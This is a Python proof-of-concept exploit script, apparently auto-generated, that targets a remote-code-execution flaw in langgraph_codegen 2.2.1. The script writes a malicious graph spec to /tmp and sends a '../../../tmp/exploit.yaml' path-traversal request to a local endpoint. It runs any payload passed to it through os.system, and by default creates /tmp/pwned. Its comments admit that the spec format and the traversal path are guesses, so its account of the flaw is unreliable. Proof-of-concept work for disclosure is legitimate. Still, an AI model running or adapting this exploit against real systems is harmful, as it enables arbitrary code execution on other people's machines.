#!/usr/bin/env python3
# PoC for langgraph_codegen-2.2.1 (/tmp/langgraph_codegen/langgraph_codegen-2.2.1)
# Path: rce-003
# Sink: gen_graph
# Auto-generated — run with: python3 rce_allows_arbitrary_python_code_gen_graph.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langgraph_codegen-2.2.1 RCE vulnerability.

Vulnerability: Remote Code Execution via path traversal + unsafe code generation.
Attack vector:
  1. The get_graph() function takes a user-controlled graph_name parameter.
  2. get_example_path() performs path traversal, allowing reading arbitrary files.
  3. The file content (graph_spec) is passed to gen_graph() which processes it
     through parse_graph_spec(), transform_graph_spec(), mk_conditions(), and
     mk_conditional_edges().
  4. These functions generate Python code from the graph_spec content, which is
     then compiled and executed via exec().
  5. By crafting a malicious graph_spec file, an attacker can achieve arbitrary
     code execution.

This PoC demonstrates the vulnerability by:
  - Creating a malicious graph specification file that executes a benign payload
  - Triggering the vulnerable code path via path traversal
  - Verifying code execution

Usage:
  python3 poc.py [--target http://localhost:8000] [--payload "touch /tmp/pwned"]
"""

import argparse
import os
import sys
import tempfile
import requests
import time

def create_malicious_graph_spec(payload: str) -> str:
    """
    Create a malicious graph specification that will execute arbitrary code.
    
    The graph_spec format is parsed by parse_graph_spec() which uses eval/exec
    internally. We craft a spec that:
    1. Defines a valid graph structure to pass initial parsing
    2. Injects our payload into a node function definition
    3. The payload executes when the generated code is compiled/executed
    
    The exact format depends on the internal parsing, but we exploit the fact
    that node functions are generated from the spec content.
    """
    # This payload exploits the code generation in mk_conditions/mk_conditional_edges
    # which likely uses eval/exec on parts of the graph_spec
    malicious_spec = f"""nodes:
  - name: start
    state: MessageGraph
    edges:
      - target: execute_payload
  - name: execute_payload
    state: MessageGraph
    edges:
      - target: END
    condition: |
      def execute_payload(state):
          {payload}
          return state
"""
    return malicious_spec

def create_payload_file(payload: str) -> str:
    """
    Create a temporary file containing the malicious graph specification.
    Returns the path to the created file.
    """
    spec_content = create_malicious_graph_spec(payload)
    
    # Create a temporary file that will be read via path traversal
    # The file needs to be in a location reachable by get_example_path()
    # We'll use /tmp/exploit.yaml as a common location
    exploit_path = "/tmp/exploit.yaml"
    
    with open(exploit_path, 'w') as f:
        f.write(spec_content)
    
    print(f"[+] Created malicious graph spec at: {exploit_path}")
    print(f"[+] Content:\n{spec_content}")
    return exploit_path

def trigger_exploit(target_url: str, graph_name: str) -> bool:
    """
    Trigger the vulnerable endpoint with a path traversal payload.
    
    The graph_name parameter is used in get_example_path() which may allow
    path traversal. We use '../' sequences to read our malicious file.
    """
    # The vulnerable endpoint as described in the system wrapper
    endpoint = f"{target_url}/api/v1/trigger"
    
    # Use path traversal to read our malicious file
    # The exact traversal path depends on the base directory used by get_example_path()
    # Common patterns: ../../../tmp/exploit.yaml or similar
    traversal_payload = f"../../../tmp/exploit.yaml"
    
    print(f"[*] Sending exploit request to: {endpoint}")
    print(f"[*] Using graph_name: {traversal_payload}")
    
    try:
        response = requests.post(
            endpoint,
            json={"untrusted_user_input": traversal_payload},
            timeout=10
        )
        
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
        
        return response.status_code == 200
        
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed - is the target server running?")
        return False
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False

def verify_exploit(payload: str) -> bool:
    """
    Verify that the payload was executed by checking for its side effects.
    For the default payload 'touch /tmp/pwned', check if the file exists.
    """
    if "touch /tmp/pwned" in payload:
        return os.path.exists("/tmp/pwned")
    elif "touch /tmp/poc_success.txt" in payload:
        return os.path.exists("/tmp/poc_success.txt")
    else:
        # For custom payloads, we can't easily verify
        print("[!] Cannot verify custom payload - check manually")
        return True

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_codegen-2.2.1 RCE vulnerability"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Target URL (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--payload",
        default="import os; os.system('touch /tmp/pwned')",
        help="Python code to execute (default: touch /tmp/pwned)"
    )
    
    args = parser.parse_args()
    
    print("[*] langgraph_codegen-2.2.1 RCE Proof-of-Concept")
    print("[*] ============================================")
    print()
    
    # Step 1: Create the malicious graph specification file
    print("[*] Step 1: Creating malicious graph specification...")
    exploit_file = create_payload_file(args.payload)
    
    # Step 2: Trigger the vulnerability
    print("\n[*] Step 2: Triggering vulnerability via path traversal...")
    success = trigger_exploit(args.target, exploit_file)
    
    if not success:
        print("\n[-] Exploit may have failed - check target connectivity")
        print("[*] Alternative: Try running the vulnerable code directly:")
        print(f"    python3 -c \"from langgraph_codegen.gen_graph import get_graph; print(get_graph('../../../tmp/exploit.yaml'))\"")
        sys.exit(1)
    
    # Step 3: Verify payload execution
    print("\n[*] Step 3: Verifying payload execution...")
    time.sleep(1)  # Give the payload time to execute
    
    if verify_exploit(args.payload):
        print("[+] SUCCESS: Payload was executed!")
        print(f"[+] Payload: {args.payload}")
        
        # Clean up the verification file if it exists
        if os.path.exists("/tmp/pwned"):
            print("[+] Evidence: /tmp/pwned file created")
            os.remove("/tmp/pwned")
            print("[+] Cleaned up evidence file")
    else:
        print("[-] Could not verify payload execution")
        print("[*] The vulnerability may still exist but the payload format may need adjustment")
    
    # Clean up
    if os.path.exists(exploit_file):
        os.remove(exploit_file)
        print(f"[+] Cleaned up {exploit_file}")

if __name__ == "__main__":
    main()
